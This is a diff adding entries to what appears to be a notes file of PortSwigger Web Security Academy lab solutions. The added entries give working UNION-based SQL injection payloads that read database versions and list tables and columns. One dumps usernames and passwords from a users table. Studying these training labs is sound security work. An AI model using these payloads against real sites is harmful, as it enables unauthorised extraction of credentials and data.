@@ -6,3 +6,14 @@ solution: https://ac981f241f895a09809e911400b6010f7.web-security-academy.net/fil
 url: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
 solution: https://acb51f961f942ea980fa01b60065006d.web-security-academy.net/filter?category=Corporate+gifts' UNION SELECT null,banner FROM v$version--
 
+[lab: SQL injection attack, querying the database type and version on MySQL and Microsoft]
+url: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
+solution: https://acc51f671f380132802638e500580053.web-security-academy.net/filter?category=Corporate+gifts' union select @@version,null%23
+
+[lab: SQL injection attack, listing the database contents on non-Oracle databases]
+help: https://www.youtube.com/watch?v=nq3KTL3Cnog
+url: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
+solution: 
+  step-1: https://ac811f551f4261c480cb1cc3009c00e4.web-security-academy.net/filter?category=Food+%26+Drink' union select table_name,null from information_schema.tables--
+  step-2: https://ac811f551f4261c480cb1cc3009c00e4.web-security-academy.net/filter?category=Food+%26+Drink' union select column_name,null from information_schema.columns where table_name='users_jxwhjs'--
+  step-3: https://ac811f551f4261c480cb1cc3009c00e4.web-security-academy.net/filter?category=Food+%26+Drink' union select username_kivqza,password_vsfmuo from users_jxwhjs--
